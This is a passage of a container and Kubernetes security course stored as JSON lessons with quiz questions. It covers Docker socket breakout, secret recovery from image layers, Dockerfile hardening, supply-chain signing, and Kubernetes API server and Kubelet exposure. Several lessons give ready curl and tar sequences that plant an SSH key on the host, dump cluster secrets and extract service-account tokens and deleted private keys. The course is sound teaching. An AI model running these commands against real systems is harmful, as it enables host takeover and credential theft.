<code>/sys/fs/cgroup/**</code>.</li>\n</ul>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The <code>release_agent</code> vector abuses the <strong>kernel's host-context cgroup cleanup callbacks</strong> to escape containment.</li>\n    <li>Prerequisites include <code>CAP_SYS_ADMIN</code>, absent AppArmor profiles, and resolving the host storage path via <code>/etc/mtab</code>.</li>\n    <li>Adopting <strong>Cgroups v2 and enforcing AppArmor/Seccomp</strong> eliminates this attack surface permanently.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Cgroups Version Detection</div>\n  <p>Evaluate the host cgroup environment:</p>\n  <pre><code class=\"language-bash\">cat /sys/fs/cgroup/cgroup.controllers</code></pre>\n  <p>If this file exists and lists active controllers (e.g. <code>cpu memory pids</code>), does the system run Cgroups v1 or v2? Is the <code>release_agent</code> attack vector applicable?</p>\n</div>\n","checkpoints":[{"question":"What kernel mechanism is exploited during a Cgroups release_agent container breakout?","options":["Overflowing host buffers via network packet fragmentation","When the final task in a cgroup terminates with notify_on_release enabled, the kernel invokes the script path specified in release_agent with host root context","Poisoning Docker build layer cache","Flooding internal DNS resolvers"],"answer":1,"explanation":"The release_agent mechanism triggers a host-level kernel cleanup callback when a control group empties, allowing attackers with CAP_SYS_ADMIN to execute arbitrary host commands."},{"question":"How do attackers solve the challenge of determining their container script's absolute path on the host during a release_agent exploit?","options":["Guessing paths by pinging the docker bridge","Parsing /etc/mtab inside the container to extract the absolute upperdir path of the Overlay2 storage driver on the host","Brute-forcing all directory names under /home","Querying external public IP resolvers"],"answer":1,"explanation":"The container's /etc/mtab documents the overlay mount parameters, where upperdir exposes the container's read-write layer path on the physical host filesystem."}]},
  "cloud-02-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Daemon Hijacking</div>\n  <h1>Docker Socket Mount Abuse &amp; Daemon Breakout</h1>\n  <p class=\"lead\">To enable \"building containers inside containers\" or hosting monitoring dashboards, DevOps engineers frequently mount <code>/var/run/docker.sock</code> into unprivileged workloads. This grants complete administrative control over the host. This lesson explores Docker Socket exploitation and modern unprivileged alternatives.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>The Docker Daemon API Model</strong>: Understanding how <code>docker.sock</code> exposes unauthenticated REST API control over the local host.</li>\n    <li><strong>Crafting Socket Breakouts via Raw HTTP</strong>: Using <code>curl --unix-socket</code> to command the daemon to launch a host-mounted privileged breakout container.</li>\n    <li><strong>Unprivileged Image Building Alternatives</strong>: Transitioning CI/CD pipelines to Kaniko and Buildah to completely eliminate socket exposure.</li>\n  </ul>\n</div>\n\n<h2>1. The Security Implications of Docker Socket Access</h2>\n<p>By default, the Docker client communicates with <code>dockerd</code> via the local UNIX domain socket <code>/var/run/docker.sock</code> using standard HTTP REST endpoints:</p>\n\n<pre><code class=\"language-text\">[Compromised Application Container]\n       │\n       ▼ (Communicates over mounted /var/run/docker.sock)\n[UNIX Domain Socket: /var/run/docker.sock]\n       │\n       ▼ (Interacts directly with host daemon)\n[Docker Daemon (dockerd: running as Host Root)]\n       │\n       ▼ (Accepts instructions to create containers)\n[Spawns secondary privileged container mounting host /: Host Compromised!]</code></pre>\n\n<div class=\"callout callout-danger\">\n  <div class=\"callout-title\">🚨 The Golden Rule: Access to docker.sock = Host Root Access</div>\n  <p>Any process capable of writing to <code>docker.sock</code> can instruct the Docker daemon to spawn an arbitrary privileged container mounting the physical host drive. Mounting this socket in untrusted workloads grants immediate host root access!</p>\n</div>\n\n<h2>2. Hands-on: Escaping via Raw Unix Socket API</h2>\n<p>An attacker who breaches a container mounting <code>docker.sock</code> can escape even without the <code>docker</code> binary installed:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Docker Socket Escape via Raw API</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Audit socket availability\ncontainer$ ls -l /var/run/docker.sock\nsrw-rw---- 1 root 999 0 Mar 15 10:00 /var/run/docker.sock\n\n# 2. Enumerate host containers via raw HTTP over UNIX socket\ncontainer$ curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# 3. Create a breakout container that mounts the host root directory\ncontainer$ curl -X POST --unix-socket /var/run/docker.sock \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"Image\": \"alpine\",\n    \"Cmd\": [\"sh\", \"-c\", \"chroot /host /bin/bash -c \\\"echo evil_key &gt;&gt; /root/.ssh/authorized_keys\\\"\"],\n    \"Binds\": [\"/:/host:rw\"],\n    \"Privileged\": true\n  }' \\\n  http://localhost/containers/create?name=pwn_container\n\n# 4. Start the container to execute the payload\ncontainer$ curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/pwn_container/start\n\n# 5. SSH directly into the host machine using the planted key!</code></pre>\n  </div>\n</div>\n\n<h2>3. The DooD Pattern in Legacy CI/CD</h2>\n<p>In legacy CI/CD systems (Jenkins, GitLab CI), pipelines ran inside containers and needed to compile Docker images. Developers adopted <strong>DooD (Docker-outside-of-Docker)</strong>, mounting the host socket. Consequently, any committer could submit a malicious build script that extracted credentials from the host daemon.</p>\n\n<h2>4. Modern Unprivileged Image Building Alternatives</h2>\n<p>Production environments replace Docker socket mounts with unprivileged container builders:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Tooling</th>\n      <th>Origin &amp; Project</th>\n      <th>Architecture &amp; Security Advantages</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Kaniko</strong></td>\n      <td>GoogleContainerTools/kaniko</td>\n      <td>Executes in user-space inside a container; unpacks and snapshots layers into tarballs <strong>without any daemon or root privileges</strong></td>\n    </tr>\n    <tr>\n      <td><strong>Buildah</strong></td>\n      <td>containers/buildah</td>\n      <td>OCI image builder supporting rootless operations, integrating natively into Kubernetes pods</td>\n    </tr>\n    <tr>\n      <td><strong>Rootless DinD</strong></td>\n      <td>moby/moby</td>\n      <td>Runs an isolated daemon within a dedicated user namespace, isolating crashes and exploits from the host</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The <code>/var/run/docker.sock</code> interface lacks granular RBAC; <strong>socket access is functionally equivalent to host root access</strong>.</li>\n    <li>Attackers can utilize simple <code>curl --unix-socket</code> commands to deploy privileged breakout containers mounting the host drive.</li>\n    <li>Enterprise CI/CD pipelines must transition to <strong>daemonless builders like Kaniko or Buildah</strong>, prohibiting socket forwarding.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Kubernetes Admission Control</div>\n  <p>Draft a Kyverno or OPA Gatekeeper policy rule that intercepts and rejects any Pod manifest attempting to mount <code>hostPath: /var/run/docker.sock</code>.</p>\n</div>\n","checkpoints":[{"question":"Why does mounting '/var/run/docker.sock' into an unprivileged container equate to handing over host root access?","options":["docker.sock is a read-only telemetry file with zero risk","docker.sock is the unauthenticated local control API for the Docker daemon; any container communicating with it can instruct dockerd to launch host-mounted privileged breakout containers","It consumes all available network bandwidth on the host","It prevents the container from communicating with databases"],"answer":1,"explanation":"The Docker daemon executes as host root and exposes a full REST API over docker.sock. Any process that can write to this socket can command the daemon to spawn privileged breakout pods."},{"question":"Which modern daemonless tooling is recommended to replace Docker socket mounts for building container images securely within CI/CD pipelines?","options":["Wireshark","Kaniko or Buildah","Nmap","Metasploit"],"answer":1,"explanation":"Kaniko and Buildah build container images in unprivileged user space without requiring a host daemon or root capabilities, eliminating the need to forward docker.sock into build workloads."}]},
  "cloud-03-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Storage &amp; Reversal</div>\n  <h1>OverlayFS Layering &amp; Sensitive Secret Recovery</h1>\n  <p class=\"lead\">\"If I append <code>RUN rm -rf /root/.ssh</code> in a Dockerfile, is my private key securely erased?\" The answer is an unequivocal no. Due to the copy-on-write and immutable layer design of UnionFS/OverlayFS, deletions simply apply a visual mask. This lesson dissects OverlayFS mechanics and demonstrates secret extraction from historical layers.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Dissecting the 3 Core OverlayFS Directories</strong>: Understanding how <code>lowerdir</code> (immutable layers), <code>upperdir</code> (read-write mutations), and <code>merged</code> (unified view) interact.</li>\n    <li><strong>Copy-on-Write (CoW) &amp; Whiteout Masks</strong>: Files removed in subsequent layers remain byte-for-byte intact on disk, masked only by character device whiteout nodes.</li>\n    <li><strong>Extracting Residual Secrets from Image Tarballs</strong>: Deconstructing Docker images to harvest deleted private keys, database passwords, and API tokens.</li>\n  </ul>\n</div>\n\n<h2>1. The Reality of Image Layering: Immutable Stacks</h2>\n<p>A Docker image is an immutable stack of <strong>read-only content-addressable layer tarballs</strong> unified via the OverlayFS (overlay2) storage driver:</p>\n\n<pre><code class=\"language-text\">[Merged Unified View (What container processes see)]\n       ▲\n       ├── [Upperdir (Read-write modifications during runtime)]\n       └── [Lowerdir (Immutable layers generated by Dockerfile instructions)]\n              ├── Layer 3: RUN rm -rf /root/.ssh (Creates a whiteout marker masking the path!)\n              ├── Layer 2: COPY id_rsa /root/.ssh/id_rsa (Private key remains completely untouched!)\n              └── Layer 1: FROM alpine:latest (Base distribution layers)</code></pre>\n\n<h2>2. Why RUN rm Is Merely Security Theater</h2>\n<p>When an application executes <code>rm file.txt</code> against an asset in a read-only <code>lowerdir</code>, the kernel <strong>cannot alter immutable parent layers</strong>. Instead, it writes a <strong>Whiteout character device (major/minor 0,0)</strong> into <code>upperdir</code>:</p>\n<ol>\n  <li>In the merged union view, encountering this whiteout marker causes filesystem lookups to report that the file does not exist.</li>\n  <li>However, when the image is published to a container registry, <strong>all historical layer tarballs are uploaded intact</strong>! Any user can download the image, unpack the historical layer archive, and harvest the secret.</li>\n</ol>\n\n<h2>3. Hands-on: Harvesting Leaked Secrets from Image Tarballs</h2>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Extracting Leaked Secrets from Image Tarball</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Export the suspicious container image to a tar archive\n$ docker save vulnerable-app:latest -o image.tar\n\n# 2. Unpack the image archive to examine layer structures\n$ mkdir -p /tmp/extracted_image &amp;&amp; tar -xf image.tar -C /tmp/extracted_image\n$ cd /tmp/extracted_image &amp;&amp; ls -F\nmanifest.json  repositories  blobs/  5f4a7c.../  9e2b1d.../\n\n# 3. Locate sensitive credentials across all historical layer archives\n$ find . -name \"layer.tar\" -exec tar -tf {} \\; | grep -E \"id_rsa|\\.env|credentials\"\nroot/.ssh/id_rsa\napp/.env.production\n\n# 4. Extract the deleted SSH private key directly from the originating layer!\n$ tar -xf 5f4a7c.../layer.tar root/.ssh/id_rsa -O &gt; leaked_id_rsa\n$ head -n 3 leaked_id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACD...</code></pre>\n  </div>\n</div>\n\n<h2>4. Production Remediation: BuildKit Secret Mounts</h2>\n<p>To prevent secrets from ever baking into immutable layer history, deploy BuildKit's <strong>transient secret mount syntax</strong>:</p>\n\n<pre><code class=\"language-dockerfile\"># syntax=docker/dockerfile:1\nFROM alpine:latest\n\n# ✅ Secure: Secrets reside exclusively in transient memory during build execution!\nRUN --mount=type=secret,id=mysecret \\\n    export API_KEY=$(cat /run/secrets/mysecret) &amp;&amp; \\\n    ./fetch_private_packages.sh</code></pre>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>OverlayFS utilizes <strong>immutable read-only lower layers and whiteout device masking</strong>; <code>RUN rm</code> cannot purge historical data.</li>\n    <li>Images published to registries contain all layer tarballs, allowing adversaries to extract deleted credentials using standard archive utilities.</li>\n    <li>Inject credentials safely using <strong>BuildKit <code>RUN --mount=type=secret</code></strong> or multistage workflows.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Image Layer Forensics</div>\n  <p>Run <code>docker history --no-trunc vulnerable-app:latest</code> to identify which build instruction introduced over 100MB of unnecessary compiler artifacts into the image history.</p>\n</div>\n","checkpoints":[{"question":"Why does appending 'RUN rm -rf /root/.ssh/id_rsa' in a Dockerfile fail to purge sensitive keys added in a previous layer?","options":["Linux prohibits removing files named id_rsa","OverlayFS image layers are immutable; deletions simply write a whiteout character device into upperdir while the secret remains permanently archived in the historical layer tarball","The rm binary is mocked inside containers","Files are only erased after restarting the container"],"answer":1,"explanation":"Docker layers are immutable. File deletion in an upper layer merely creates a whiteout masking device; anyone downloading the image from a registry can extract the original tarball containing the plaintext key."},{"question":"How can sensitive API credentials be consumed during container image builds without persisting them into image layer archives?","options":["Placing passwords in Dockerfile comments","Employing BuildKit's transient secret mount syntax: RUN --mount=type=secret,id=mysecret","Renaming private key files to public_key.pub","Base64-encoding private keys prior to building"],"answer":1,"explanation":"BuildKit's --mount=type=secret mounts secrets in transient memory exclusively for the duration of that RUN execution, unmounting them immediately before the layer is snapshotted."}]},
  "cloud-03-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Hardening Standards</div>\n  <h1>Dockerfile Hardening Baselines &amp; Multi-Stage Builds</h1>\n  <p class=\"lead\">Container images are the atomic unit of modern cloud delivery. If an image ships with default root execution, unpatched system libraries, or resident build tools like GCC, attackers who compromise an application can easily compile rootkits in-place. This lesson examines production Dockerfile hardening standards and multi-stage builds.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Enforcing Non-Root Execution Baselines</strong>: Explicitly creating and switching to unprivileged system accounts (<code>USER appuser</code>).</li>\n    <li><strong>Leveraging Multi-Stage Builds</strong>: Decoupling heavyweight compilation toolchains to produce lightweight, minimal runtime artifacts.</li>\n    <li><strong>Adopting Distroless Images &amp; Read-Only Rootfs</strong>: Eliminating shell interpreters and package managers to dramatically shrink the attack surface.</li>\n  </ul>\n</div>\n\n<h2>1. Five Common Dockerfile Vulnerability Patterns</h2>\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Defect Pattern</th>\n      <th>Operational Exploitation Risk</th>\n      <th>Remediation Baseline</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Running as Default Root</strong></td>\n      <td>Application injection flaws immediately yield container root context, easing breakout exploits</td>\n      <td>Declare <code>USER appuser:appgroup</code> to drop administrative rights</td>\n    </tr>\n    <tr>\n      <td><strong>Residual Compilers (gcc/make)</strong></td>\n      <td>Adversaries can download C exploits and compile kernel privilege escalations locally</td>\n      <td>Purge build tools or isolate them within staging phases</td>\n    </tr>\n    <tr>\n      <td><strong>Heavyweight OS Base Images</strong></td>\n      <td>Bloated Ubuntu/CentOS bases bring thousands of unneeded packages and CVEs</td>\n      <td>Standardize on Alpine Linux or Google Distroless minimal images</td>\n    </tr>\n    <tr>\n      <td><strong>Floating 'latest' Tags without Hashes</strong></td>\n      <td>Upstream changes can introduce unverified breaking changes or tainted dependencies</td>\n      <td>Pin specific versions with SHA256 digests: <code>alpine:3.19@sha256:...</code></td>\n    </tr>\n    <tr>\n      <td><strong>Writable Root Filesystem</strong></td>\n      <td>Attackers can drop persistent cryptominers or trojans into <code>/tmp</code> or <code>/bin</code></td>\n      <td>Enforce read-only containers via <code>--read-only</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Multi-Stage Builds: Balancing Velocity &amp; Security</h2>\n<p>For compiled languages (Go, Rust, Java), multi-stage builds cleanly separate large SDKs from production deliverables:</p>\n\n<pre><code class=\"language-dockerfile\"># Stage 1: Build & Compilation (Contains Go toolchain, SDKs, and source)\nFROM golang:1.22-alpine AS builder\nWORKDIR /app\nCOPY go.mod go.sum ./\nRUN go mod download\nCOPY . .\n# Compile statically linked standalone executable\nRUN CGO_ENABLED=0 GOOS=linux go build -ldflags=\"-w -s\" -o /app/server .\n\n# Stage 2: Production Runtime (Ultra-hardened minimal container)\nFROM gcr.io/distroless/static-debian12:nonroot\nWORKDIR /app\n# Copy strictly the binary deliverable, discarding compilers and source code!\nCOPY --from=builder /app/server /app/server\n# Run as nonroot user (UID 65532)\nUSER nonroot:nonroot\nEXPOSE 8080\nENTRYPOINT [\"/app/server\"]</code></pre>\n\n<h2>3. The Power of Distroless Containers</h2>\n<p>Google <strong>Distroless</strong> images package solely an application and its immediate runtime dependencies. They <strong>omit package managers, text editors, and shell interpreters like /bin/sh and /bin/bash</strong>:</p>\n<ul>\n  <li>If an adversary discovers a remote code execution flaw and attempts <code>/bin/sh -c \"whoami\"</code> or <code>curl evil.com | bash</code>, the kernel throws an immediate <code>No such file or directory</code> error.</li>\n  <li>Automated reverse shell tools and payload droppers fail completely in shell-free environments.</li>\n</ul>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Production images must adhere to <strong>least privilege</strong>, banning root user processes in web-facing containers.</li>\n    <li><strong>Multi-stage builds</strong> strip compilers and intermediate build tokens, yielding minimal security footprints.</li>\n    <li>Combining <strong>Distroless bases with read-only root filesystems</strong> neutralizes standard interactive breakout payloads.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Dockerfile Audit &amp; Refactoring</div>\n  <p>Review this insecure Dockerfile snippet, identify 3 vulnerabilities, and rewrite it following enterprise hardening standards:</p>\n  <pre><code class=\"language-dockerfile\">FROM python:3.9\nWORKDIR /app\nCOPY . /app\nRUN pip install -r requirements.txt\nCMD [\"python\", \"app.py\"]</code></pre>\n</div>\n","checkpoints":[{"question":"What is the primary security advantage of utilizing Multi-stage Builds in production container images?","options":["Increasing the overall size of the image archive","Decoupling heavyweight compilation toolchains (e.g. GCC, Go SDK) from deliverables, producing lightweight runtime images containing strictly the standalone executable","Allowing containers to operate without an OS kernel","Automatically generating free SSL certificates"],"answer":1,"explanation":"Multi-stage builds allow developers to compile code in rich environments while discarding compilers, SDKs, and build tokens from the final deliverable, drastically reducing the attack surface."},{"question":"What fundamental architectural feature makes Google Distroless base images exceptionally resilient against interactive exploitation?","options":["They include commercial enterprise firewalls","They omit package managers (apt/apk), system utilities, and shell interpreters (/bin/sh, /bin/bash), neutralizing most reverse shells and payload droppers","They exclusively execute Python code","They automatically encrypt all network egress"],"answer":1,"explanation":"Distroless images package strictly the application binary and runtime libraries. With no shell interpreters present, attackers who achieve command injection cannot spawn interactive shells or invoke curl/bash."}]},
  "cloud-03-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Supply Chain Defense</div>\n  <h1>Image Scanning, Cosign Signatures &amp; SBOM</h1>\n  <p class=\"lead\">Software supply chain attacks bypass traditional network perimeter defenses by compromising upstream assets. If adversaries push backdoored image tags into your registry, host-level isolation cannot differentiate legitimate code from malware. This lesson explores vulnerability triage with Trivy, keyless signing with Cosign, and Software Bill of Materials (SBOM) integration.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Automated Vulnerability Scanning with Trivy</strong>: Identifying critical CVEs across OS packages and language ecosystems (npm, pip, Go).</li>\n    <li><strong>Cryptographic Image Signing via Sigstore / Cosign</strong>: Leveraging keyless OIDC identity tokens and Rekor transparency logs to sign artifacts.</li>\n    <li><strong>Generating &amp; Auditing Software Bill of Materials (SBOM)</strong>: Exporting machine-readable CycloneDX / SPDX inventories to track component provenance.</li>\n  </ul>\n</div>\n\n<h2>1. The Container Supply Chain Threat Landscape</h2>\n<p>Software travels through multiple custody transfers between developer workstations and production clusters:</p>\n\n<pre><code class=\"language-text\">[Developer commits Dockerfile] ──Tainted base image dependency──▶ [Typosquatting Supply Chain Risk]\n            │\n            ▼\n[CI/CD Build Pipeline] ──Build script tampering / Dependency confusion──▶ [Backdoor Injection]\n            │\n            ▼\n[Container Registry] ──Unauthorized image tag overwrite──▶ [Compromised Image at Rest]\n            │\n            ▼\n[Kubernetes Cluster Runtime] ──No cryptographic signature validation──▶ [Malicious Pod Deployed]</code></pre>\n\n<h2>2. Automated Scanning: Trivy in Production Pipelines</h2>\n<p><strong>Trivy</strong> inspects image layers to locate known CVEs and insecure configuration profiles:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Trivy Image Vulnerability Scan</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Scan container image for critical and high vulnerabilities\n$ trivy image --severity CRITICAL,HIGH mycompany/web-app:v1.2.0\n\n# 2. Generate machine-readable CycloneDX SBOM specification\n$ trivy image --format cyclonedx --output sbom.json mycompany/web-app:v1.2.0\n\n# 3. Pipeline Gate: Halt CI/CD build if fixed critical CVEs are discovered\n$ trivy image --exit-code 1 --ignore-unfixed --severity CRITICAL mycompany/web-app:v1.2.0</code></pre>\n  </div>\n</div>\n\n<h2>3. Cryptographic Verification: Sigstore &amp; Cosign</h2>\n<p>How can clusters guarantee images originate from authenticated maintainers without unauthorized alteration? <strong>Cryptographic signatures</strong>:</p>\n\n<pre><code class=\"language-bash\"># 1. Generate a public/private keypair (or leverage keyless OIDC workflows)\n$ cosign generate-key-pair\nEnter password for private key:\nPrivate key written to cosign.key\nPublic key written to cosign.pub\n\n# 2. Cryptographically sign the remote registry artifact\n$ cosign sign --key cosign.key mycompany/web-app:v1.2.0\nPushing signature to: index.docker.io/mycompany/web-app:sha256-abc...sig\n\n# 3. Verify signature validity before deployment\n$ cosign verify --key cosign.pub mycompany/web-app:v1.2.0\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - The signatures were successfully verified against the public key\n[{\"critical\":{\"identity\":{\"docker-reference\":\"mycompany/web-app\"},\"image\":{\"docker-manifest-digest\":\"sha256:abc...\"}}}]</code></pre>\n\n<h2>4. Enforcing Signatures with Kubernetes Admission Controllers</h2>\n<p>Deploy <strong>Kyverno</strong> or <strong>OPA Gatekeeper</strong> at cluster perimeters to block unsigned images at the API server boundary:</p>\n\n<pre><code class=\"language-yaml\">apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: verify-image-signatures\nspec:\n  validationFailureAction: Enforce\n  rules:\n    - name: verify-trusted-developer-signature\n      match:\n        resources:\n          kinds:\n            - Pod\n      verifyImages:\n        - imageReferences:\n            - \"mycompany/*\"\n          attestors:\n            - entries:\n                - keys:\n                    publicKeys: |-\n                      -----BEGIN PUBLIC KEY-----\n                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...\n                      -----END PUBLIC KEY-----</code></pre>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Security verification must <strong>shift left into CI/CD pipelines</strong>, using Trivy to automatically fail builds with critical CVEs.</li>\n    <li><strong>Cosign establishes verifiable provenance for container artifacts</strong>, neutralizing registry-level tampering.</li>\n    <li>Pairing <strong>SBOM inventories with Kubernetes admission controllers</strong> creates end-to-end zero-trust supply chain validation.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: SBOM Dependency Auditing</div>\n  <p>Generate an SBOM for a multi-dependency container image and use <code>jq</code> to extract all components licensed under copyleft regimes or matching legacy OpenSSL/Log4j vulnerability signatures.</p>\n</div>\n","checkpoints":[{"question":"What is the primary role of Cosign within container supply chain defense architectures?","options":["Conducting network packet replay testing","Digitally signing and verifying container images to guarantee that clusters only execute authenticated artifacts from verified build pipelines","Fixing Dockerfile syntax errors automatically","Monitoring container CPU utilization metrics"],"answer":1,"explanation":"Cosign cryptographically signs container digests. Kubernetes admission controllers verify these signatures before scheduling pods, preventing untrusted or tampered images from executing."},{"question":"What is the critical operational benefit of generating a Software Bill of Materials (SBOM) for container images?","options":["Serving as an init system startup script","Providing a machine-readable inventory of all software packages and dependencies, enabling instant correlation when widespread vulnerabilities (e.g. Log4j) are disclosed","Registering public domain names automatically","Increasing database query concurrency inside containers"],"answer":1,"explanation":"An SBOM provides a structured manifest of every library and component in a workload. When zero-day vulnerabilities emerge, defenders can query SBOM databases to pinpoint vulnerable assets across fleets in seconds."}]},
  "cloud-04-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Cluster Operations</div>\n  <h1>K8s API Server Misconfigs &amp; Kubelet 10250 Exploitation</h1>\n  <p class=\"lead\">Kubernetes serves as the distributed operating system of modern cloud architectures. As the brain and muscular control centers, the API Server (6443/8080) and Kubelet (10250) present catastrophic single points of failure if misconfigured or exposed anonymously. This lesson dissects control plane exposure vectors and hardening baselines.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Dissecting K8s Management Endpoints</strong>: Distinguishing secure HTTPS 6443 ports from legacy insecure 8080 cleartext interfaces.</li>\n    <li><strong>Exploiting Kubelet 10250 Anonymous RCE</strong>: Bypassing the central API Server to execute commands directly inside worker node pods via native Kubelet REST endpoints.</li>\n    <li><strong>CIS Kubernetes Hardening Baselines</strong>: Enforcing <code>--anonymous-auth=false</code> and Webhook authorization to reject unauthenticated requests.</li>\n  </ul>\n</div>\n\n<h2>1. Control Plane &amp; Node Communication Topology</h2>\n<p>Cluster operations coordinate through <strong>kube-apiserver</strong>, while worker nodes run the <strong>kubelet</strong> daemon:</p>\n\n<pre><code class=\"language-text\">[Attacker / Operator kubectl]\n       │\n       ▼ (6443 HTTPS Port / 8080 Legacy Insecure Port)\n[kube-apiserver (Control Plane Brain)] ──State Storage──▶ [etcd Datastore (Port 2379)]\n       │\n       ▼ (Internal scheduling &amp; execution directives)\n[Worker Node: kubelet (Port 10250)] ──CRI Container Runtime──▶ [Running Workload Pods]</code></pre>\n\n<h2>2. The Insecure API Server Port (8080) Disaster</h2>\n<p>Legacy deployments or careless debug scripts occasionally flag <code>--insecure-port=8080</code>. This port <strong>bypasses all authentication, skips RBAC checks, and executes requests with global cluster-admin authority</strong>:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Insecure API Server Exploitation</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Discover open unauthenticated 8080 port and verify cluster version\n$ curl http://192.168.1.100:8080/version\n{\n  \"major\": \"1\",\n  \"minor\": \"25\",\n  \"gitVersion\": \"v1.25.0\"\n}\n\n# 2. Extract cluster-wide secrets (including database credentials and JWTs)\n$ curl http://192.168.1.100:8080/api/v1/secrets\n\n# 3. Spawn a host-mounted breakout pod directly in default namespace!\n$ curl -X POST http://192.168.1.100:8080/api/v1/namespaces/default/pods \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"apiVersion\": \"v1\",\n    \"kind\": \"Pod\",\n    \"metadata\": { \"name\": \"pwn-pod\" },\n    \"spec\": {\n      \"containers\": [{\n        \"name\": \"pwn\",\n        \"image\": \"alpine\",\n        \"command\": [\"sh\", \"-c\", \"echo evil_key &gt;&gt; /host/root/.ssh/authorized_keys &amp;&amp; sleep 3600\"],\n        \"volumeMounts\": [{ \"mountPath\": \"/host\", \"name\": \"host-volume\" }]\n      }],\n      \"volumes\": [{ \"name\": \"host-volume\", \"hostPath\": { \"path\": \"/\" } }]\n    }\n  }'</code></pre>\n  </div>\n</div>\n\n<h2>3. Deep Dive: Kubelet 10250 Anonymous Remote Code Execution</h2>\n<p>While API Servers are often firewalled, the <strong>Kubelet port 10250</strong> on worker nodes is frequently left exposed internally. If <code>--anonymous-auth=true</code> remains enabled, attackers can issue direct remote command execution commands:</p>\n\n<pre><code class=\"language-bash\"># 1. Enumerate all running pods on the specific worker node\n$ curl -k https://192.168.1.105:10250/runningpods/\n\n# 2. Execute commands inside any pod container without traversing the API Server!\n# Endpoint: /run/&lt;namespace&gt;/&lt;pod-name&gt;/&lt;container-name&gt;\n$ curl -k -X POST \"https://192.168.1.105:10250/run/default/frontend-pod/nginx\" \\\n  -d \"cmd=id\"\nuid=0(root) gid=0(root) groups=0(root)\n\n# 3. Harvest container ServiceAccount tokens\n$ curl -k -X POST \"https://192.168.1.105:10250/run/default/frontend-pod/nginx\" \\\n  -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\"</code></pre>\n\n<h2>4. CIS Kubernetes Benchmark Hardening Matrix</h2>\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Component</th>\n      <th>Vulnerable Configuration</th>\n      <th>Compliant Hardened Parameter</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>API Server</strong></td>\n      